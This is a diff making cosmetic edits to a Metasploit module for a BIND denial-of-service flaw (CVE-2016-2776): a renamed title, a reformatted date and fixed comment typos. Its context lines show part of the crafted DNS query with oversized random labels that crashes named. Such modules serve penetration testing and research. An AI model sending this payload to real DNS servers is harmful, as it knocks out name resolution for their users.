@@ -10,7 +10,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'BIND TKEY Query Denial of Service',
+      'Name'           => 'BIND TSIG Query Denial of Service',
       'Description'    => %q{
         A defect in the rendering of messages into packets can cause named to
         exit with an assertion failure in buffer.c while constructing a response
@@ -30,7 +30,7 @@ class MetasploitModule < Msf::Auxiliary
         ['CVE', '2016-2776'],
         ['URL', 'http://blog.infobytesec.com/2016/10/a-tale-of-dns-packet-cve-2016-2776.html']
       ],
-      'DisclosureDate' => 'Sep 27 2016',
+      'DisclosureDate' => '2016-09-27',
       'License'        => MSF_LICENSE,
       'DefaultOptions' => {'ScannerRecvWindow' => 0}
     ))
@@ -60,13 +60,13 @@ class MetasploitModule < Msf::Auxiliary
     query << "\x00\x00"  # Authority RRs: 0
     query << "\x00\x01"  # Additional RRs: 1
 
-    # Doman Name
+    # Domain Name
     query << get_domain   # Random DNS Name
     query << "\x00"      # [End of name]
     query << "\x00\x01"  # Type: A (Host Address) (1)
     query << "\x00\x01"  # Class: IN (0x0001)
 
-    # Aditional records. Name
+    # Additional records. Name
     query << ("\x3f"+Rex::Text.rand_text_alphanumeric(63))*3 #192 bytes
     query << "\x3d"+Rex::Text.rand_text_alphanumeric(61)
     query << "\x00"
